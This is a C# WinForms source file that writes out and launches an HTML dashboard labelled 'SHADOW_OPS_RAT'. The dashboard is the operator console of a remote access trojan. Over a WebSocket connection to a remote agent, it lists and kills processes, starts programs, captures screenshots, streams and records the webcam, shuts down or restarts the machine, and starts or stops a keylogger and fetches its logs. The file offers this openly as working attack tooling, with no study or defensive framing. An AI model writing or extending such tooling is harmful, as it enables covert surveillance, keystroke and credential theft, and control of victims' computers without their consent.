using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Drawing;

namespace client
{
    public partial class client : Form
    {
        string htmlPath = Path.Combine(Application.StartupPath, "shadow_ops.html");

        string htmlContent = @"
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <title>SHADOW_ROOT_ACCESS</title>
    <style>
        :root { --bg: #050505; --panel: #111; --border: #333; --accent: #ff0000; --text: #ccc; }
        body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; margin: 0; padding: 10px; height: 100vh; overflow: hidden; font-size: 11px; box-sizing: border-box; }
        .grid { display: grid; grid-template-columns: 2.5fr 5fr 2.5fr; grid-template-rows: 50px 1fr 200px; gap: 10px; height: 100%; }
        .box { background: var(--panel); border: 1px solid var(--border); padding: 10px; display: flex; flex-direction: column; overflow: hidden; }
        .box:hover { border-color: var(--accent); }
        .box h3 { margin: 0 0 10px 0; color: var(--accent); border-bottom: 1px solid var(--accent); padding-bottom: 5px; font-size: 12px; font-weight: bold; letter-spacing: 1px; }
        .header { grid-column: 1 / -1; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--accent); background: #000; }
        .title { font-size: 20px; font-weight: bold; color: var(--accent); }
        .ctrl-group { display: flex; gap: 5px; margin-bottom: 5px; }
        input { background: #111; border: 1px solid #444; color: #fff; padding: 4px; flex: 1; text-align: center; font-family: inherit; font-size: 11px; }
        button { background: #151515; color: #888; border: 1px solid #444; padding: 4px 10px; cursor: pointer; font-weight: bold; transition: 0.2s; font-family: inherit; font-size: 10px; width: 60px; }
        button:hover { border-color: var(--accent); color: var(--accent); }
        .scroll-box { flex: 1; overflow-y: auto; background: #000; border: 1px solid #222; padding: 5px; white-space: pre-wrap; word-break: break-all; }
        table { width: 100%; border-collapse: collapse; } 
        td { padding: 3px; border-bottom: 1px solid #222; white-space: nowrap; } 
        tr:hover { background: #222; color: #fff; cursor: pointer; }
        .pid { color: var(--accent); width: 50px; font-weight: bold; }
        #media-view { flex: 1; border: 1px dashed #444; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        img { max-width: 100%; max-height: 100%; object-fit: contain; }
    </style>
</head>
<body>
    <div class='grid'>
        <div class='box header'>
            <div class='title'>/// SHADOW_OPS_RAT ///</div>
            <div id='status' style='color:#555'>STATUS: DISCONNECTED</div>
        </div>

        <div class='box'>
            <h3> APPLICATIONS</h3>
            <button onclick=""send('LIST_APPS')"" style='width:100%'>REFRESH LIST</button>
            <div class='ctrl-group'><input id='appNameStart' placeholder='App Name (e.g. notepad)'><button onclick=""startApp('appNameStart')"">START</button></div>
            <div class='ctrl-group'><input id='appPidStop' placeholder='PID'><button onclick=""stopApp('appPidStop')"" style='color:#a00'>STOP</button></div>
            <div class='scroll-box' id='list-apps'></div>
        </div>

        <div class='box'>
            <h3>SURVEILLANCE</h3>
            <div style='display:flex; gap:5px; margin-bottom:5px'>
                <button onclick=""send('SCREENSHOT')"" style='flex:1'>SNAP</button>
                <button onclick=""recWebcam()"" id='btnCam' style='flex:1; color:yellow'>REC 10s</button>
                <button onclick=""send('RESUME_STREAM')"" >RESUME</button>
                <button onclick=""send('STOP_STREAM')"" >STOP</button>

            </div>
            <div id='media-view'>NO SIGNAL</div>
            <div style='margin-top:auto; padding-top:10px; border-top:1px solid #333'>
                <label style='color:red; font-size:9px'>POWER OPS</label>
                <div style='display:flex; gap:5px'>
                    <button onclick=""if(confirm('SHUTDOWN?')) send('SHUTDOWN')"" style='color:red'>OFF</button>
                    <button onclick=""if(confirm('RESTART?')) send('RESTART')"" style='color:orange'>RST</button>
                    <button onclick=""send('DISCONNECT')"" style='color:green'>QUIT</button>
                </div>
                <div style='margin-top:10px'>
                    <input id='ip' value='127.0.0.1' style='width:96%; margin-bottom:5px'>
                    <button onclick='connect()' style='width:100%'>CONNECT</button>
                </div>
            </div>
        </div>

        <div class='box'>
            <h3> PROCESSES</h3>
            <button onclick=""send('LIST_PROCS')"" style='width:100%'>REFRESH LIST</button>
            <div class='ctrl-group'><input id='procNameStart' placeholder='Process Name'><button onclick=""startApp('procNameStart')"">START</button></div>
            <div class='ctrl-group'><input id='procPidStop' placeholder='PID'><button onclick=""stopApp('procPidStop')"" style='color:#a00'>STOP</button></div>
            <div class='scroll-box' id='list-procs'></div>
        </div>

        <div class='box' style=""grid-column: 1 / -1;"">
            <div style='display:flex; justify-content:space-between; align-items:center; margin-bottom:5px'>
                <h3>[3] KEYLOGGER</h3>
                <button id='btnKey' onclick=""toggleKeylog()"" style='width:150px; color:#0ff'>START KEYLOG</button>
            </div>
            <div id='terminal' class='scroll-box' style='font-family:monospace; color:#0f0; border:none'>
                <div>[SYS] Ready.</div>
            </div>
        </div>
    </div>

    <script>
        var ws; 
        var term = document.getElementById('terminal');
        var isKeylogging = false;

        function log(msg, type) {
            term.innerHTML += '<div>>> ' + msg + '</div>';
            term.scrollTop = term.scrollHeight;
        }

        function connect() {
            var ip = document.getElementById('ip').value;
            ws = new WebSocket('ws://' + ip + ':8080');
            log('Connecting...');
            ws.onopen = function() {
                document.getElementById('status').innerText = 'STATUS: CONNECTED';
                document.getElementById('status').style.color = '#0f0';
                log('CONNECTED.');
            };
            ws.onmessage = function(e) {
                var d = e.data;
                if(d.startsWith('IMG|')) {
                    document.getElementById('media-view').innerHTML = '<img src=\'data:image/jpeg;base64,' + d.substring(4) + '\'>';
                }

                else if (d.startsWith(""LIVE|"")) {
                    document.getElementById(""media-view"").innerHTML =
                        ""<img src='data:image/jpeg;base64,"" + d.substring(5) + ""'>"";
                }

                else if(d.startsWith('VID|')) {
                    var base64Video = d.substring(4);
                    log('Video received. Downloading...');
                    var a = document.createElement('a');
                    a.href = 'data:video/avi;base64,' + base64Video;
                    a.download = 'webcam_' + new Date().getTime() + '.avi';
                    a.click();
                    var btn = document.getElementById('btnCam');
                    btn.disabled = false; btn.innerText = 'REC 10s';
                }
                else if(d.startsWith('LIST_APPS|')) renderList(d.substring(10), 'list-apps', 'appPidStop', 'appNameStart');
                else if(d.startsWith('LIST_PROCS|')) renderList(d.substring(11), 'list-procs', 'procPidStop', 'procNameStart');
                else if(d.startsWith('KEYLOG|')) log(d.substring(7));
                else log(d);
            };

            ws.onclose = function() {
                log('Disconnected from server.');
                document.getElementById('media-view').innerHTML = 'NO SIGNAL';
                document.getElementById('status').innerText = 'STATUS: DISCONNECTED';
                document.getElementById('status').style.color = '#f00';
            };

            ws.onerror = function(err) {
                console.error('WebSocket error:', err);
                document.getElementById('media-view').innerHTML = 'NO SIGNAL';
            };
        }

        function send(c) { if(ws && ws.readyState==1) ws.send(c); else log('Error: Not Connected'); }
        function startApp(id) { var n = document.getElementById(id).value; if(n) { send('START|'+n); log('Request Start: '+n); } }
        function stopApp(id) { var p = document.getElementById(id).value; if(p) { send('KILL|'+p); log('Request Kill PID: '+p); } }
        function recWebcam() { send('WEBCAM_START'); log('Requesting 10s video...'); var btn = document.getElementById('btnCam'); btn.disabled = true; btn.innerText = 'REC...'; }

        function toggleKeylog() {
            var btn = document.getElementById('btnKey');
            if (!isKeylogging) {
                send('KEYLOG_START'); isKeylogging = true;
                btn.innerText = 'STOP & GET LOGS'; btn.style.color = 'yellow';
                log('Keylogger Started...');
            } else {
                send('KEYLOG_STOP'); isKeylogging = false;
                btn.innerText = 'START KEYLOG'; btn.style.color = '#0ff';
                log('Fetching logs...');
            }
            btn.blur(); // QUAN TRỌNG: Bỏ focus để ấn Space không bị tắt
        }

        function fill(idStop, idStart, pid, name) {
            document.getElementById(idStop).value = pid;
            var startName = name;
            if(name.indexOf('[') > -1) startName = name.split('[')[1].replace(']', '').trim();
            document.getElementById(idStart).value = startName;
        }

        function renderList(data, divId, idStop, idStart) {
            var rows = data.split(';'); 
            var html = '<table>';
            html += '<tr style=\'color:#666\'><td style=\'width:50px\'>PID</td><td>NAME</td></tr>';
            for(var i=0; i<rows.length; i++) {
                var r = rows[i];
                if(r) {
                    var p = r.split('|||'); // Tách bằng ||| để không lỗi
                    if(p.length >= 2) {
                        var safeName = p[1].replace(/'/g, ''); 
                        html += '<tr onclick=""fill(\'' + idStop + '\', \'' + idStart + '\', \'' + p[0] + '\', \'' + safeName + '\')"">';
                        html += '<td class=\'pid\'>' + p[0] + '</td><td>' + p[1] + '</td></tr>';
                    }
                }
            }
            document.getElementById(divId).innerHTML = html + '</table>';
        }

    </script>
</body>
</html>";

        public client()
        {
            this.Text = "SHADOW OPS LAUNCHER";
            this.Size = new Size(400, 200);
            this.BackColor = Color.Black;
            this.StartPosition = FormStartPosition.CenterScreen;
            Button btn = new Button(); btn.Text = "LAUNCH DASHBOARD"; btn.Dock = DockStyle.Fill;
            btn.ForeColor = Color.Red; btn.BackColor = Color.Black; btn.FlatStyle = FlatStyle.Flat;
            btn.Font = new Font("Consolas", 14, FontStyle.Bold);
            btn.Click += (s, e) => { OpenWeb(); };
            this.Controls.Add(btn);
            OpenWeb();
        }

        void OpenWeb() { try { File.WriteAllText(htmlPath, htmlContent); Process.Start("msedge.exe", "\"" + htmlPath + "\""); } catch { } }
    }
}